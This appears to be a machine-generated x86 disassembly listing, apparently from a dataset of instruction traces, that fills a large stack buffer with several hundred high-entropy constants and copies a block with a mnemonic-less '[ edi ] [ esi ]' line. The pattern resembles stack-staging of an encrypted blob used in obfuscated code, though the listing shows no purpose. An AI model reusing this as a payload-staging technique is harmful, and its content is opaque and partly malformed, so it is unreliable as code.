mov [ ebp - 0x6d8 ] 0x925bd13a
mov [ ebp - 0x6d4 ] 0x21c019f8
mov [ ebp - 0x6d0 ] 0xa6a570bd
mov [ ebp - 0x6cc ] 0x66ac9a61
mov [ ebp - 0x6c8 ] 0xc29b6366
mov [ ebp - 0x6c4 ] 0xaad7bec2
mov [ ebp - 0x6c0 ] 0xfe511948
mov [ ebp - 0x6bc ] 0xf0476cb5
mov [ ebp - 0x6b8 ] 0x3682a33e
mov [ ebp - 0x6b4 ] 0x795742bc
mov [ ebp - 0x6b0 ] 0x131ffdb2
mov [ ebp - 0x6ac ] 0xfe79cb97
mov [ ebp - 0x6a8 ] 0xf0c0152e
mov [ ebp - 0x6a4 ] 0x1c9b97d3
mov [ ebp - 0x6a0 ] 0x651aecb0
mov [ ebp - 0x69c ] 0x97556159
mov [ ebp - 0x698 ] 0xc0cdd704
mov [ ebp - 0x694 ] 0xcb3a2519
mov [ ebp - 0x690 ] 0xb9df5922
mov [ ebp - 0x68c ] 0x53b75825
mov [ ebp - 0x688 ] 0x4144776d
mov [ ebp - 0x684 ] 0xbe5ddf0e
mov [ ebp - 0x680 ] 0x242477cb
mov [ ebp - 0x67c ] 0xddbb79d8
mov [ ebp - 0x678 ] 0x6a9d8951
mov [ ebp - 0x674 ] 0xd036d7ae
mov [ ebp - 0x670 ] 0x56891531
mov [ ebp - 0x66c ] 0xdba9416d
mov [ ebp - 0x668 ] 0xc71cedb8
mov [ ebp - 0x664 ] 0x988579cc
mov [ ebp - 0x660 ] 0xc8bca9f0
mov [ ebp - 0x65c ] 0x74a57823
mov [ ebp - 0x658 ] 0xafde4301
mov [ ebp - 0x654 ] 0x4b7f141a
mov [ ebp - 0x650 ] 0x97a10829
mov [ ebp - 0x64c ] 0x2724b49
mov [ ebp - 0x648 ] 0x5c98e38
mov [ ebp - 0x644 ] 0xf79d4e07
mov [ ebp - 0x640 ] 0x1bbf59f8
mov [ ebp - 0x63c ] 0xd28f65d1
mov [ ebp - 0x638 ] 0xc2816da8
mov [ ebp - 0x634 ] 0xab0e0082
mov [ ebp - 0x630 ] 0x5242af09
mov [ ebp - 0x62c ] 0x3354b4fa
mov [ ebp - 0x628 ] 0x49381d42
mov [ ebp - 0x624 ] 0x6440d56c
mov [ ebp - 0x620 ] 0x7f002e
mov [ ebp - 0x61c ] 0xdd20e65
mov [ ebp - 0x618 ] 0xfdcf547b
mov [ ebp - 0x614 ] 0x5da9dd54
mov [ ebp - 0x610 ] 0x87b0eb8d
mov [ ebp - 0x60c ] 0xe2ba04a0
mov [ ebp - 0x608 ] 0x8e2cf222
mov [ ebp - 0x604 ] 0xf6f26cc7
mov [ ebp - 0x600 ] 0xd1f6716c
mov [ ebp - 0x5fc ] 0xfadec87f
mov [ ebp - 0x5f8 ] 0x71f8ae1c
mov [ ebp - 0x5f4 ] 0x18cea18b
mov [ ebp - 0x5f0 ] 0x2ca07e8c
mov [ ebp - 0x5ec ] 0xa50f5a83
mov [ ebp - 0x5e8 ] 0x14333b4d
mov [ ebp - 0x5e4 ] 0x140a25a7
mov [ ebp - 0x5e0 ] 0x15e50096
mov [ ebp - 0x5dc ] 0xe50fc4c9
mov [ ebp - 0x5d8 ] 0xfd560772
mov [ ebp - 0x5d4 ] 0x351625a8
mov [ ebp - 0x5d0 ] 0x2661b6a3
mov [ ebp - 0x5cc ] 0x5dcb7010
mov [ ebp - 0x5c8 ] 0x5372feab
mov [ ebp - 0x5c4 ] 0xb9677c23
mov [ ebp - 0x5c0 ] 0x46ce4c7d
mov [ ebp - 0x5bc ] 0x822bde10
mov [ ebp - 0x5b8 ] 0x8e8082e5
mov [ ebp - 0x5b4 ] 0x4ac396a7
mov [ ebp - 0x5b0 ] 0x5c71244c
mov [ ebp - 0x5ac ] 0x40ba3c95
mov [ ebp - 0x5a8 ] 0x5e932c3b
mov [ ebp - 0x5a4 ] 0x2518faa8
mov [ ebp - 0x5a0 ] 0x576be647
mov [ ebp - 0x59c ] 0xaada97c4
mov [ ebp - 0x598 ] 0xc0385a19
mov [ ebp - 0x594 ] 0x3c0afbf0
mov [ ebp - 0x590 ] 0xb4987b1f
mov [ ebp - 0x58c ] 0xf3f552b8
mov [ ebp - 0x588 ] 0x2751887e
mov [ ebp - 0x584 ] 0xca4c6983
mov [ ebp - 0x580 ] 0x1421b850
mov [ ebp - 0x57c ] 0x68befb4f
mov [ ebp - 0x578 ] 0x4528f655
mov [ ebp - 0x574 ] 0x118132f1
mov [ ebp - 0x570 ] 0x66c51aae
mov [ ebp - 0x56c ] 0xeb59ba6c
mov [ ebp - 0x568 ] 0xc612aa43
mov [ ebp - 0x564 ] 0x64905e14
mov [ ebp - 0x560 ] 0x6578b116
mov [ ebp - 0x55c ] 0x2cd37ad
mov [ ebp - 0x558 ] 0x1f48f52d
mov [ ebp - 0x554 ] 0xd630c928
mov [ ebp - 0x550 ] 0x503cf5e3
mov [ ebp - 0x54c ] 0xf33b95b0
mov [ ebp - 0x548 ] 0x53b94d3f
mov [ ebp - 0x544 ] 0xc2b749ab
mov [ ebp - 0x540 ] 0xa72730fa
mov [ ebp - 0x53c ] 0x94aaf567
mov [ ebp - 0x538 ] 0x12b3f2ea
mov [ ebp - 0x534 ] 0x9fe8e3bb
mov [ ebp - 0x530 ] 0x89ef24d9
mov [ ebp - 0x52c ] 0xf97c2ab9
mov [ ebp - 0x528 ] 0x224c3577
mov [ ebp - 0x524 ] 0x78e4047e
mov [ ebp - 0x520 ] 0x9b200c34
mov [ ebp - 0x51c ] 0xeb2fca01
mov [ ebp - 0x518 ] 0x77fee3bc
mov [ ebp - 0x514 ] 0x9f16e6c6
mov [ ebp - 0x510 ] 0xc428050b
mov [ ebp - 0x50c ] 0xa6bda42f
mov [ ebp - 0x508 ] 0x57c90ad9
mov [ ebp - 0x504 ] 0x42d0ad0e
mov [ ebp - 0x500 ] 0xbaddf0b9
mov [ ebp - 0x4fc ] 0x76a60cba
mov [ ebp - 0x4f8 ] 0xb6eda4ef
mov [ ebp - 0x4f4 ] 0x9555048a
mov [ ebp - 0x4f0 ] 0x395a7e09
mov [ ebp - 0x4ec ] 0xfcdf1722
mov [ ebp - 0x4e8 ] 0x2f53a821
mov [ ebp - 0x4e4 ] 0xf712356
mov [ ebp - 0x4e0 ] 0xcdca4e13
mov [ ebp - 0x4dc ] 0x4a43705b
mov [ ebp - 0x4d8 ] 0x9e003114
mov [ ebp - 0x4d4 ] 0x3e345635
mov [ ebp - 0x4d0 ] 0xf6778ed4
mov [ ebp - 0x4cc ] 0xc7f257a5
mov [ ebp - 0x4c8 ] 0x55f646ff
mov [ ebp - 0x4c4 ] 0x7d656869
mov [ ebp - 0x4c0 ] 0x114a2fb6
mov [ ebp - 0x4bc ] 0xb35c8e9f
mov [ ebp - 0x4b8 ] 0xf4515cbf
mov [ ebp - 0x4b4 ] 0x863285b2
mov [ ebp - 0x4b0 ] 0xb97daa13
mov [ ebp - 0x4ac ] 0x806f01
mov [ ebp - 0x4a8 ] 0x1f5676b5
mov [ ebp - 0x4a4 ] 0x959cbbde
mov [ ebp - 0x4a0 ] 0x89a6e6ea
mov [ ebp - 0x49c ] 0x333c0274
mov [ ebp - 0x498 ] 0x11278d5f
mov [ ebp - 0x494 ] 0x26985a13
mov [ ebp - 0x490 ] 0x5df1504
mov [ ebp - 0x48c ] 0x3a055f84
mov [ ebp - 0x488 ] 0xb4595bd6
mov [ ebp - 0x484 ] 0x49f516
mov [ ebp - 0x480 ] 0x5089f0db
mov [ ebp - 0x47c ] 0x5183c5f2
mov [ ebp - 0x478 ] 0x6663ab53
mov [ ebp - 0x474 ] 0x98cfb05
mov [ ebp - 0x470 ] 0x940e6c10
mov [ ebp - 0x46c ] 0xa1ce13cb
mov [ ebp - 0x468 ] 0x8556276f
mov [ ebp - 0x464 ] 0xf8869f1c
mov [ ebp - 0x460 ] 0x82480f8f
mov [ ebp - 0x45c ] 0x28d3cbd5
mov [ ebp - 0x458 ] 0x7b8e3676
mov [ ebp - 0x454 ] 0x41841a31
mov [ ebp - 0x450 ] 0x52d69286
mov [ ebp - 0x44c ] 0x15f3a4a6
mov [ ebp - 0x448 ] 0xe89a49cc
mov [ ebp - 0x444 ] 0x78e020e9
mov [ ebp - 0x440 ] 0x5fa2830
mov [ ebp - 0x43c ] 0x6a2dcef4
mov [ ebp - 0x438 ] 0x36e6bb04
mov [ ebp - 0x434 ] 0x5c776ad5
mov [ ebp - 0x430 ] 0xa3ae4dfd
mov [ ebp - 0x42c ] 0xbeb8a1f2
mov [ ebp - 0x428 ] 0xd4a652eb
mov [ ebp - 0x424 ] 0xa34c8773
mov [ ebp - 0x420 ] 0xa3a847af
mov [ ebp - 0x41c ] 0x190ed515
mov [ ebp - 0x418 ] 0x654ff490
mov [ ebp - 0x414 ] 0x5bc1c75e
mov [ ebp - 0x410 ] 0x6fe6f14
mov [ ebp - 0x40c ] 0xfcc4b611
mov [ ebp - 0x408 ] 0x7cd06b09
mov [ ebp - 0x404 ] 0xa11f1cf2
mov [ ebp - 0x400 ] 0x7845c763
mov [ ebp - 0x3fc ] 0x2c92539c
mov [ ebp - 0x3f8 ] 0xa591e147
mov [ ebp - 0x3f4 ] 0xbd0153a8
mov [ ebp - 0x3f0 ] 0xd3c3ffc2
mov [ ebp - 0x3ec ] 0xbfcf88b6
mov [ ebp - 0x3e8 ] 0xe53b9ff3
mov [ ebp - 0x3e4 ] 0x1f865abc
mov [ ebp - 0x3e0 ] 0xbd98cb21
mov [ ebp - 0x3dc ] 0x65e92a1e
mov [ ebp - 0x3d8 ] 0xb40b7a0b
mov [ ebp - 0x3d4 ] 0x90710ccd
mov [ ebp - 0x3d0 ] 0xc163340b
mov [ ebp - 0x3cc ] 0xaf8033bc
mov [ ebp - 0x3c8 ] 0x8e94bbd2
mov [ ebp - 0x3c4 ] 0x36ae1b15
mov [ ebp - 0x3c0 ] 0x5f346e6
mov [ ebp - 0x3bc ] 0x7b6adc70
mov [ ebp - 0x3b8 ] 0x242f7557
mov [ ebp - 0x3b4 ] 0x8db4a081
mov [ ebp - 0x3b0 ] 0x914e18d5
mov [ ebp - 0x3ac ] 0x1d41cf4b
mov [ ebp - 0x3a8 ] 0xa0acd58a
mov [ ebp - 0x3a4 ] 0xd7d65af0
mov [ ebp - 0x3a0 ] 0x10dccaa0
mov [ ebp - 0x39c ] 0xfd8b46a6
mov [ ebp - 0x398 ] 0x3d22bbbc
mov [ ebp - 0x394 ] 0x30cad65b
mov [ ebp - 0x390 ] 0x39c219ee
mov [ ebp - 0x38c ] 0x725703e8
mov [ ebp - 0x388 ] 0xc91203d8
mov [ ebp - 0x384 ] 0xfda0e95d
mov [ ebp - 0x380 ] 0x590d7cb3
mov [ ebp - 0x37c ] 0x7e5798c2
mov [ ebp - 0x378 ] 0xafbc7953
mov [ ebp - 0x374 ] 0x3edf864f
mov [ ebp - 0x370 ] 0x8777a19f
mov [ ebp - 0x36c ] 0x7dfacea4
mov [ ebp - 0x368 ] 0x2e460cd1
mov [ ebp - 0x364 ] 0xa82be6f5
mov [ ebp - 0x360 ] 0x24023862
mov [ ebp - 0x35c ] 0x24a359d1
mov [ ebp - 0x358 ] 0x21d35fd2
mov [ ebp - 0x354 ] 0x855fb3e5
mov [ ebp - 0x350 ] 0xf90cd754
mov [ ebp - 0x34c ] 0x777606a5
mov [ ebp - 0x348 ] 0x8a5bc13
mov [ ebp - 0x344 ] 0x4b1d1a2
mov [ ebp - 0x340 ] 0xda28b309
mov [ ebp - 0x33c ] 0xdeffcb0c
mov [ ebp - 0x338 ] 0x10ffd22a
mov [ ebp - 0x334 ] 0xda955f85
mov [ ebp - 0x330 ] 0xdbd3a136
mov [ ebp - 0x32c ] 0xbb5249a8
mov [ ebp - 0x328 ] 0xa7c3f805
mov [ ebp - 0x324 ] 0xd2ab74c9
mov [ ebp - 0x320 ] 0x33add327
mov [ ebp - 0x31c ] 0xc911ac9f
mov [ ebp - 0x318 ] 0x4d9117e
mov [ ebp - 0x314 ] 0xa6de6e70
mov [ ebp - 0x310 ] 0xb881b110
mov [ ebp - 0x30c ] 0xff73d4fa
mov [ ebp - 0x308 ] 0x95a636cc
mov [ ebp - 0x304 ] 0xd26751ab
mov [ ebp - 0x300 ] 0xc3061424
mov [ ebp - 0x2fc ] 0x3f8d17c0
mov [ ebp - 0x2f8 ] 0x98436628
mov [ ebp - 0x2f4 ] 0xe53e21d5
mov [ ebp - 0x2f0 ] 0xcc9dc0d2
mov [ ebp - 0x2ec ] 0x60cb1094
mov [ ebp - 0x2e8 ] 0xf1f57146
mov [ ebp - 0x2e4 ] 0xe6c45cc2
mov [ ebp - 0x2e0 ] 0x31aaca71
mov [ ebp - 0x2dc ] 0xa7037e1
mov [ ebp - 0x2d8 ] 0x72a2b39d
mov [ ebp - 0x2d4 ] 0xa657e1d4
mov [ ebp - 0x2d0 ] 0x3572f4a1
mov [ ebp - 0x2cc ] 0x4b953d04
mov [ ebp - 0x2c8 ] 0x703c8aae
mov [ ebp - 0x2c4 ] 0x575700e6
mov [ ebp - 0x2c0 ] 0xac8901ca
mov [ ebp - 0x2bc ] 0xd5b6f938
mov [ ebp - 0x2b8 ] 0x814858ad
mov [ ebp - 0x2b4 ] 0xda289f39
mov [ ebp - 0x2b0 ] 0x980f9a94
mov [ ebp - 0x2ac ] 0x86e3a4d8
mov [ ebp - 0x2a8 ] 0x15f7202e
mov [ ebp - 0x2a4 ] 0xeb6c4e20
mov [ ebp - 0x2a0 ] 0x8797f54f
mov [ ebp - 0x29c ] 0x9c5c4def
mov [ ebp - 0x298 ] 0xdf1da4a5
mov [ ebp - 0x294 ] 0xd8b94544
mov [ ebp - 0x290 ] 0xb870c9e0
mov [ ebp - 0x28c ] 0x9c3e546d
mov [ ebp - 0x288 ] 0x94b13574
mov [ ebp - 0x284 ] 0xd27f1d83
mov [ ebp - 0x280 ] 0x2591613
mov [ ebp - 0x27c ] 0x99eb663
mov [ ebp - 0x278 ] 0x9ee8bb5a
mov [ ebp - 0x274 ] 0xe176a101
mov [ ebp - 0x270 ] 0xd899e76a
mov [ ebp - 0x26c ] 0xaf74d73b
mov [ ebp - 0x268 ] 0x9043250d
mov [ ebp - 0x264 ] 0x5563c342
mov [ ebp - 0x260 ] 0x3d57bcd9
mov [ ebp - 0x25c ] 0xcd46f572
mov [ ebp - 0x258 ] 0xb26b2eb1
mov [ ebp - 0x254 ] 0x3a93e2cf
mov [ ebp - 0x250 ] 0x4122cc9
mov [ ebp - 0x24c ] 0x10b38603
mov [ ebp - 0x248 ] 0xeda1f6ab
mov [ ebp - 0x244 ] 0x934304b9
mov [ ebp - 0x240 ] 0x33d09ac0
mov [ ebp - 0x23c ] 0x41001690
mov [ ebp - 0x238 ] 0x13f36b44
mov [ ebp - 0x234 ] 0x164d864d
mov [ ebp - 0x230 ] 0xb51a5fb2
mov [ ebp - 0x22c ] 0x90c6cde5
mov [ ebp - 0x228 ] 0x7d7e67c4
mov [ ebp - 0x224 ] 0x2b10c16b
mov [ ebp - 0x220 ] 0xeb5ee05b
mov [ ebp - 0x21c ] 0x3a2c5ef6
mov [ ebp - 0x218 ] 0x174e1fca
mov [ ebp - 0x214 ] 0x572e9ba5
mov [ ebp - 0x210 ] 0xe00d48fb
mov [ ebp - 0x20c ] 0xda71d316
mov [ ebp - 0x208 ] 0xa557ef3a
mov [ ebp - 0x204 ] 0xbd068b0
mov [ ebp - 0x200 ] 0x3ff72f48
mov [ ebp - 0x1fc ] 0x5779238d
mov [ ebp - 0x1f8 ] 0xe86fc743
mov [ ebp - 0x1f4 ] 0x5e409d63
mov [ ebp - 0x1f0 ] 0xfb3e4de5
mov [ ebp - 0x1ec ] 0x5ad5af20
mov [ ebp - 0x1e8 ] 0x4eff2d9e
mov [ ebp - 0x1e4 ] 0xdd5acf95
mov [ ebp - 0x1e0 ] 0x8c1c51fe
mov [ ebp - 0x1dc ] 0xb7e39674
mov [ ebp - 0x1d8 ] 0xc0a0525d
mov [ ebp - 0x1d4 ] 0xd51ee0ef
mov [ ebp - 0x1d0 ] 0x4dd05d2d
mov [ ebp - 0x1cc ] 0xaba7a60c
mov [ ebp - 0x1c8 ] 0x68f9a6d3
mov [ ebp - 0x1c4 ] 0x74455375
mov [ ebp - 0x1c0 ] 0x190062a4
mov [ ebp - 0x1bc ] 0x55d0e3f8
mov [ ebp - 0x1b8 ] 0x25167036
mov [ ebp - 0x1b4 ] 0x7dfa3450
mov [ ebp - 0x1b0 ] 0x9ecacb91
mov [ ebp - 0x1ac ] 0x44497171
mov [ ebp - 0x1a8 ] 0x8dac4217
mov [ ebp - 0x1a4 ] 0x3a01f196
mov [ ebp - 0x1a0 ] 0x4b530153
mov [ ebp - 0x19c ] 0x1aa124e4
mov [ ebp - 0x198 ] 0xe540b794
mov [ ebp - 0x194 ] 0x7d623aeb
mov [ ebp - 0x190 ] 0x761b2d05
mov [ ebp - 0x18c ] 0xb6ba649e
mov [ ebp - 0x188 ] 0x3c4366a6
mov [ ebp - 0x184 ] 0xab774458
mov [ ebp - 0x180 ] 0x29f7ca45
mov [ ebp - 0x17c ] 0x834498ee
mov [ ebp - 0x178 ] 0x3a68844f
mov [ ebp - 0x174 ] 0xc4b7cabe
mov [ ebp - 0x170 ] 0x963ad2f7
mov [ ebp - 0x16c ] 0xdd4cf536
mov [ ebp - 0x168 ] 0xb3198f5b
mov [ ebp - 0x164 ] 0x185f90d3
mov [ ebp - 0x160 ] 0x4941565b
mov [ ebp - 0x15c ] 0x3dcc85ee
mov [ ebp - 0x158 ] 0xc8773409
mov [ ebp - 0x154 ] 0xf68c2fff
mov [ ebp - 0x150 ] 0x388cc601
mov [ ebp - 0x14c ] 0x1715d8bb
mov [ ebp - 0x148 ] 0x3aca2e67
mov [ ebp - 0x144 ] 0x1a5229bf
mov [ ebp - 0x140 ] 0x6d63947f
mov [ ebp - 0x13c ] 0x23aa3019
mov [ ebp - 0x138 ] 0x63eb2264
mov [ ebp - 0x134 ] 0x525a7751
mov [ ebp - 0x130 ] 0xf98ae63d
mov [ ebp - 0x12c ] 0x26109fbf
mov [ ebp - 0x128 ] 0x8d61dace
mov [ ebp - 0x124 ] 0x83a7b304
mov [ ebp - 0x120 ] 0x61f10a47
mov [ ebp - 0x11c ] 0x9f849b3a
mov [ ebp - 0x118 ] 0xe026fbd
mov [ ebp - 0x114 ] 0x23615ce6
mov [ ebp - 0x110 ] 0x21ceb43
mov [ ebp - 0x10c ] 0x59282c8b
mov [ ebp - 0x108 ] 0xbe68907
mov [ ebp - 0x104 ] 0x848e8d3d
mov [ ebp - 0x100 ] 0xd2e57f97
mov [ ebp - 0xfc ] 0xd871691b
mov [ ebp - 0xf8 ] 0xbee773d8
mov [ ebp - 0xf4 ] 0x13e248d0
mov [ ebp - 0xf0 ] 0xbe15fe33
mov [ ebp - 0xec ] 0x32173d2b
mov ecx 0x400
lea esi [ ebp - 0x1004 ]
mov [ ebp - 0xe8 ] 0x43dfdc7
mov [ ebp - 0xe4 ] 0x2288cb8a
mov [ ebp - 0xe0 ] 0x66f46e4b
mov [ ebp - 0xdc ] 0xb03e65d7
mov [ ebp - 0xd8 ] 0xa86e25d8
mov [ ebp - 0xd4 ] 0xa1bb506d
mov [ ebp - 0xd0 ] 0x7a5fd04f
mov [ ebp - 0xcc ] 0xd5ac770e
mov [ ebp - 0xc8 ] 0xffd9e974
mov [ ebp - 0xc4 ] 0xff2161b4
mov [ ebp - 0xc0 ] 0xa76515cf
mov [ ebp - 0xbc ] 0x5257a47a
mov [ ebp - 0xb8 ] 0x37fbc5c9
mov [ ebp - 0xb4 ] 0x65d8b616
mov [ ebp - 0xb0 ] 0x95df3787
mov [ ebp - 0xac ] 0x236a8bae
mov [ ebp - 0xa8 ] 0x28224374
mov [ ebp - 0xa4 ] 0x742843a4
mov [ ebp - 0xa0 ] 0xd21b8d58
mov [ ebp - 0x9c ] 0xfb247231
mov [ ebp - 0x98 ] 0x4d321f37
mov [ ebp - 0x94 ] 0x5db20ad6
mov [ ebp - 0x90 ] 0xf0f29141
mov [ ebp - 0x8c ] 0x90135c1c
mov [ ebp - 0x88 ] 0x43b9359f
mov [ ebp - 0x84 ] 0xd0b7e178
mov [ ebp - 0x80 ] 0xa0a2d26e
mov [ ebp - 0x7c ] 0x7c9bc644
mov [ ebp - 0x78 ] 0xbcc9cde6
mov [ ebp - 0x74 ] 0x18197cd7
mov [ ebp - 0x70 ] 0x2a080b0d
mov [ ebp - 0x6c ] 0x6ba1b67
mov [ ebp - 0x68 ] 0xc8497350
mov [ ebp - 0x64 ] 0xc3980154
mov [ ebp - 0x60 ] 0x18633ad3
mov [ ebp - 0x5c ] 0xe794fe01
mov [ ebp - 0x58 ] 0xa2a35dcb
mov [ ebp - 0x54 ] 0xe7babcd9
mov [ ebp - 0x50 ] 0x2e11c3c7
mov [ ebp - 0x4c ] 0x2f34cbde
mov [ ebp - 0x48 ] 0x93f77d3f
mov [ ebp - 0x44 ] 0x5256907e
mov [ ebp - 0x40 ] 0xcb6ab9ca
mov [ ebp - 0x3c ] 0x82b2feb7
mov [ ebp - 0x38 ] 0x3524555b
mov [ ebp - 0x34 ] 0xd81cdf11
mov [ ebp - 0x30 ] 0x80062da2
mov [ ebp - 0x2c ] 0x37af3af8
mov [ ebp - 0x28 ] 0x36cba7b8
mov [ ebp - 0x24 ] 0x1882137
mov [ ebp - 0x20 ] 0x92cdf2db
mov [ ebp - 0x1c ] 0x4c157ff0
mov [ ebp - 0x18 ] 0xe68139d5
mov [ ebp - 0x14 ] 0xbabf9d18
mov [ ebp - 0x10 ] 0xc23bc5ca
mov [ ebp - 0xc ] 0xb8faea00
mov [ ebp - 0x8 ] 0xc8eec591
[ edi ] [ esi ]
mov [ ebp - 0x1004 ] 0x1e9f61b0
mov [ ebp - 0x1000 ] 0x1fe2caf0
mov [ ebp - 0xffc ] 0xd6b389ed
mov [ ebp - 0xff8 ] 0x95155967
mov [ ebp - 0xff4 ] 0x2963018e
mov [ ebp - 0xff0 ] 0xdc1761c2
mov [ ebp - 0xfec ] 0xa9498244
mov [ ebp - 0xfe8 ] 0x6a0581ba
mov [ ebp - 0xfe4 ] 0xd389a4e3
mov [ ebp - 0xfe0 ] 0x5cf26b6f
mov [ ebp - 0xfdc ] 0x5b32a6f4
mov [ ebp - 0xfd8 ] 0x8ef047ff
mov [ ebp - 0xfd4 ] 0xab75348
mov [ ebp - 0xfd0 ] 0xf9e7ceb4
mov [ ebp - 0xfcc ] 0xaa23050
mov [ ebp - 0xfc8 ] 0x9575a8b2
mov [ ebp - 0xfc4 ] 0xbb68fe4c
mov [ ebp - 0xfc0 ] 0x5d185a69
mov [ ebp - 0xfbc ] 0xb84a00
mov [ ebp - 0xfb8 ] 0xda8ea892
mov [ ebp - 0xfb4 ] 0xb0e545fb
mov [ ebp - 0xfb0 ] 0x63a9cc13
mov [ ebp - 0xfac ] 0xae6d4bfc
mov [ ebp - 0xfa8 ] 0x4043e2f3
mov [ ebp - 0xfa4 ] 0x49fbabe0
mov [ ebp - 0xfa0 ] 0x6a61306
mov [ ebp - 0xf9c ] 0xf0065e5e
mov [ ebp - 0xf98 ] 0x2ca9406
mov [ ebp - 0xf94 ] 0xecb2afd9
mov [ ebp - 0xf90 ] 0x784f5b7b
mov [ ebp - 0xf8c ] 0x9a26bda6
mov [ ebp - 0xf88 ] 0x80da6a9f
mov [ ebp - 0xf84 ] 0x1bc9d515
mov [ ebp - 0xf80 ] 0x472270e9
mov [ ebp - 0xf7c ] 0xd53728ce
mov [ ebp - 0xf78 ] 0x96d701bd
mov [ ebp - 0xf74 ] 0x2c8389b1
mov [ ebp - 0xf70 ] 0x8aa4d2e4
mov [ ebp - 0xf6c ] 0x2f24cb8f
mov [ ebp - 0xf68 ] 0x4aaffe35
mov [ ebp - 0xf64 ] 0xbd6678d4
mov [ ebp - 0xf60 ] 0xb70488e8
mov [ ebp - 0xf5c ] 0x6d8c3bb0
mov [ ebp - 0xf58 ] 0xed04633c
mov [ ebp - 0xf54 ] 0xd01a87ec
mov [ ebp - 0xf50 ] 0xe95abe59
mov [ ebp - 0xf4c ] 0xbe187f89
mov [ ebp - 0xf48 ] 0x5109c77d
mov [ ebp - 0xf44 ] 0x280e6f3f
mov [ ebp - 0xf40 ] 0xa7df12f7
mov [ ebp - 0xf3c ] 0x8a156b4d
mov [ ebp - 0xf38 ] 0xba7719ce
mov [ ebp - 0xf34 ] 0xf98a91a0
mov [ ebp - 0xf30 ] 0xd9e2e450
mov [ ebp - 0xf2c ] 0xe198fa63
mov [ ebp - 0xf28 ] 0x132a1c1
mov [ ebp - 0xf24 ] 0x7294110
mov [ ebp - 0xf20 ] 0xa1ae0853
mov [ ebp - 0xf1c ] 0x412bc373
mov [ ebp - 0xf18 ] 0x7cfba2dc
mov [ ebp - 0xf14 ] 0x84768534
mov [ ebp - 0xf10 ] 0xcd5d5869
mov [ ebp - 0xf0c ] 0x14aef553
mov [ ebp - 0xf08 ] 0xa615e096
mov [ ebp - 0xf04 ] 0x75ad3e21
mov [ ebp - 0xf00 ] 0xb9165c46
mov [ ebp - 0xefc ] 0xfcfa411f
mov [ ebp - 0xef8 ] 0x1778f5e3
mov [ ebp - 0xef4 ] 0xe49bee7a
mov [ ebp - 0xef0 ] 0x9ab1f947
mov [ ebp - 0xeec ] 0x85ae5fee
mov [ ebp - 0xee8 ] 0x612bc43f
mov [ ebp - 0xee4 ] 0x49d6d902
mov [ ebp - 0xee0 ] 0x5402ec35
mov [ ebp - 0xedc ] 0x1050fd2d
mov [ ebp - 0xed8 ] 0x6d28c9f2
mov [ ebp - 0xed4 ] 0xfe51c3b7
mov [ ebp - 0xed0 ] 0xab9802bc
mov [ ebp - 0xecc ] 0xa0304761
mov [ ebp - 0xec8 ] 0xd015b0b
mov [ ebp - 0xec4 ] 0x6956d734
mov [ ebp - 0xec0 ] 0xf0be59c3
mov [ ebp - 0xebc ] 0x48010e56
mov [ ebp - 0xeb8 ] 0x8fb529d7
mov [ ebp - 0xeb4 ] 0xa98d06ec
mov [ ebp - 0xeb0 ] 0x69542608
mov [ ebp - 0xeac ] 0x780a846d
mov [ ebp - 0xea8 ] 0x14850bdf
mov [ ebp - 0xea4 ] 0xa67ddce3
mov [ ebp - 0xea0 ] 0x8b973b35
mov [ ebp - 0xe9c ] 0x21d3984a
mov [ ebp - 0xe98 ] 0xadb089c1
mov [ ebp - 0xe94 ] 0x98563e8f
mov [ ebp - 0xe90 ] 0xd101aa64
mov [ ebp - 0xe8c ] 0xe490b2e
mov [ ebp - 0xe88 ] 0xfa22ce17
mov [ ebp - 0xe84 ] 0xdfa09faa
mov [ ebp - 0xe80 ] 0x256a37db
mov [ ebp - 0xe7c ] 0x90463ecf
mov [ ebp - 0xe78 ] 0x563ef7c7
mov [ ebp - 0xe74 ] 0x99ee9435
mov [ ebp - 0xe70 ] 0x6d6af03f
mov [ ebp - 0xe6c ] 0x127bb3fb
mov [ ebp - 0xe68 ] 0x2c0c9d81
mov [ ebp - 0xe64 ] 0x180bad3d
mov [ ebp - 0xe60 ] 0xb43d76e4
mov [ ebp - 0xe5c ] 0x7b4483b4
mov [ ebp - 0xe58 ] 0xafd1827a
mov [ ebp - 0xe54 ] 0x5648c017
mov [ ebp - 0xe50 ] 0xabc3b2b0
mov [ ebp - 0xe4c ] 0xe7be3f65
mov [ ebp - 0xe48 ] 0x1913cadc
mov [ ebp - 0xe44 ] 0x5c311e77
mov [ ebp - 0xe40 ] 0x48106e94
mov [ ebp - 0xe3c ] 0x6cc354f2
mov [ ebp - 0xe38 ] 0xee1c95d7
mov [ ebp - 0xe34 ] 0x5446455
mov [ ebp - 0xe30 ] 0x7cb00717
mov [ ebp - 0xe2c ] 0x23636e46
mov [ ebp - 0xe28 ] 0xb03c7639
mov [ ebp - 0xe24 ] 0x290c6e95
mov [ ebp - 0xe20 ] 0xce721cdc
mov [ ebp - 0xe1c ] 0x483b3571
mov [ ebp - 0xe18 ] 0x1f3657ca
mov [ ebp - 0xe14 ] 0xd2247abb
mov [ ebp - 0xe10 ] 0xc84fd581
mov [ ebp - 0xe0c ] 0x7cebb243
mov [ ebp - 0xe08 ] 0xbe2d2729
mov [ ebp - 0xe04 ] 0x72e73995
mov [ ebp - 0xe00 ] 0xc7405956
mov [ ebp - 0xdfc ] 0x590f7b8f
mov [ ebp - 0xdf8 ] 0x8e7945d2
mov [ ebp - 0xdf4 ] 0x40609dbf
mov [ ebp - 0xdf0 ] 0xb608af72
mov [ ebp - 0xdec ] 0x8b32f362
mov [ ebp - 0xde8 ] 0xb0495f1b
mov [ ebp - 0xde4 ] 0xef223099
mov [ ebp - 0xde0 ] 0x19b6638a
mov [ ebp - 0xddc ] 0xb172c5de
mov [ ebp - 0xdd8 ] 0xc93feb0a
mov [ ebp - 0xdd4 ] 0xfb099f89
mov [ ebp - 0xdd0 ] 0xb1b1124f
mov [ ebp - 0xdcc ] 0x203ce405
mov [ ebp - 0xdc8 ] 0xdcd18543
mov [ ebp - 0xdc4 ] 0x3fcbf3b5
mov [ ebp - 0xdc0 ] 0x35588156
mov [ ebp - 0xdbc ] 0x50e6cb46
mov [ ebp - 0xdb8 ] 0x3f1925b6
mov [ ebp - 0xdb4 ] 0x133b23c4
mov [ ebp - 0xdb0 ] 0x3ac4ec35
mov [ ebp - 0xdac ] 0x145b00d0
mov [ ebp - 0xda8 ] 0x3bf02c85
mov [ ebp - 0xda4 ] 0x767abc1f
mov [ ebp - 0xda0 ] 0x84abd33d
mov [ ebp - 0xd9c ] 0x54d4919e
mov [ ebp - 0xd98 ] 0x7a94eeb6
mov [ ebp - 0xd94 ] 0x468ecf11
mov [ ebp - 0xd90 ] 0x8c8052bb
